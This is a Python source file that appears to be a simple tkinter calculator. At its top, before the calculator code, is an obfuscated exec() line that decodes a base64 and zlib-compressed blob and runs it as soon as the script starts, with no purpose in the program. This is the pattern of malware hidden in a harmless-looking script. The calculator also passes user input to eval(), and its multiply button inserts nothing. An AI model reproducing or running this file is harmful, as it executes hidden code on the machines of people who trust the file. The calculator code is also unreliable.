# d93b466476d8c96e8d5a887d6c8f3099
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNqNV0lv20YUvutXEMwhUmLRsy8GcipaoJcWKHqLC4ISRxYbiRTIUWy36H_vmxkuQ0sKLMAWNfP2972FHxImhOJi8SH5w-xMa-qteUj21p66h_t7uzenV7tv6m3T1qbNts3x_tR0trsniOA1UmuK1vvmeW2b9bY1hTXr71V77taB634BYhXXSEl4-KmtTrZ5aotdVbgLTonWalEdT01rk6bzZwwxNhw9HZqNOxRIaESH033R7Q-Vv-CcEIKGi3_6U6IEYXI43RSdEcyLEZTKUXhb1GVz9AYyQrlc-EdJJNGL0uwS8KbMd9XB5IeqNt3SP54Ku189OEqspBB6kcCnLGyRfEl-a2rjbiTDQhJ_81zZfdKcTD1x3yVpm66SokvckRfFNKjHniES564zZ0RQv3KUmhEMnjmq1thzW3tir1RiKfgiPDKmhfeh2XTbc2tyn5N825RmOT0OfmihgnJI7qk1XZcfzHdzABO0DwnAQ45-5ptXazq489_LNM3-bqo6lgoOnu1urVJvsdTOmtjikI_s3B66YmfyjWAAOWeZS1822LCclN29MWzlBTMOcUbeYUwoY8FhC1ntdk17_JHLRAqKFdg0Upsyogfnvv7l6ChiyrsOJInLQlLVyUTnZUlFNSDQ-XddWlacIP_lMv2QpMnnpLPtMiAvc1_w92SWGPnPagUE6WPdRw5j9h7B3rCIj2KCsbO6j_d1bq9BCBQgo4hE0gfwydjcFk8XcGeYChZA7W_q4ugC1XSZo8lcUt1RxOYrTitMmefamKeqzl3tOvnA2pdxdiz5cjnJBE_uPW26ynpgDHhaZXvzUlZPprOhHKjCWAkvHiLxTuFA-Q7RQnKlaWR5kNtnce6Mx6BWWvHRlBl1bJuPO6Wa4rgmvk5K7kZ-j0FMuQBs--InglE-9aYI4X2OJIJa9nKvoJlpxGgAVFV3VWnmkP-lOHQeFRq6JApBvW4WEI8oyUOHzFcBRQyhgBHfnAVV4ZfvYMD2tqXOuKGzIRw6RVxvnjKULdMAwrFNVrtkOaWmp4TGWpfJsm7spZN98WNJqB6l3ArHn-3ZR4MxSNak1BxA7RCJXmfoAxoLhWZiN-DutxBRzGksows8wrWOuSnXyzuAHXo_ojFq5tVMXN7YIkQKfjCPlF1Vh5B3S6hKa9r6LmmbxuZl1fYDQGAkRSzXjd3M_btk-TLyhlgiqQI2NUbKK6zqndnaeN55M1d9lDTGauoigdiUMf4Yg32BvxN_83bDCHfTO2wGMB9EPJ5vz_MAVs177Mboc7yhtpBGQsbgu8BegJcgnNNZTt96OkBLQuQxvg4ZpThMtUXQTHhPBlodsmcCvVaOAWOjpOtbx3PYOrYHU9T5uHtwaBliZsNEkD23lTVRkc2mk4DpOGO8OU1vD-WQNQQzdF4G_d7yRs6Vbea6zmAhYmIu1byY7dkWm4MTlrpfy8c02h0fH-vZzgi_PZFfTEozriaXG4y7dNOkH_BXzPejfbVaPaartI-jbwEweN9g4CL-k9l90fFho7rN0tdKlDCmEFHyh2yhLhzkQ0kQTES_YXEhxrX4dKi2sOj3QwczGDtsGjpDpcXTKSxTfFhdXYGNyHTVEzWp9FN2ek0Brlka5MP002Ry91Z7CQZL2ReNpARmj7PXOdl64W9XGomQ5P2C9RqKV3Mp2I_r6OPzx_n2LgUGtouKz2x7rn2cUFjdKbwxhQZjXrbmZJNff_-5bZv2IWwy8DpFRiGhEQeAUKRCEiCCiISuHiDhTHo9NEXZp4IyKvoJal9s3jdvh_VPGRx4wFGJeD-Vj-Wc5FgGCgHjgI5SfFpcyx2HQiR7mALDADmWV-gnPSFLCvyIZoALq2OYlH0e5QR6xbQatwrNXdu8haNBno-HoiKeu1eR4B1AiMNu2w9ZQukiAnl4owMDLmIe0K-AeeEscb4Wh_x70VauVsPC6UcD7JThEt7ism_mFb56bCtYRVTc2q8JyTpbtLZzaFymed7XBby1k6hz-EaVlvDa9u9_aeY6YjFonUsLb0-UwIuZ2yUPV1UuFv8D6qeD5w==')))")
# 24c1e852ac430249951077d3d9acf367
import tkinter as tk

def calculate():
    try:
        result = eval(entry.get())
        output.config(text="Result: " + str(result))
    except:
        output.config(text="Invalid input!")

# Function to insert numbers
def insert_number(number):
    entry.insert(tk.END, number)

# Create the main window
window = tk.Tk()
window.title("Calculator")

# Create an entry widget for user input
entry = tk.Entry(window, width=20)
entry.pack()

# Create a button to trigger calculation
calculate_button = tk.Button(window, text="Calculate", command=calculate)
calculate_button.pack()

# Create number buttons
buttons_frame = tk.Frame(window)
buttons_frame.pack()

numbers = ["7", "8", "9", "4", "5", "6", "1", "2", "3", "0"]

for number in numbers:
    button = tk.Button(buttons_frame, text=number, command=lambda num=number: insert_number(num))
    button.pack(side=tk.LEFT)

# Create buttons for additional operations
add_button = tk.Button(buttons_frame, text="+", command=lambda: entry.insert(tk.END, "+"))
add_button.pack(side=tk.LEFT)

subtract_button = tk.Button(buttons_frame, text="-", command=lambda: entry.insert(tk.END, "-"))
subtract_button.pack(side=tk.LEFT)

multiply_button = tk.Button(buttons_frame, text="", command=lambda: entry.insert(tk.END, ""))
multiply_button.pack(side=tk.LEFT)

divide_button = tk.Button(buttons_frame, text="/", command=lambda: entry.insert(tk.END, "/"))
divide_button.pack(side=tk.LEFT)

# Create a label to display the result
output = tk.Label(window, text="Result: ")
output.pack()

# Start the main event loop
window.mainloop()
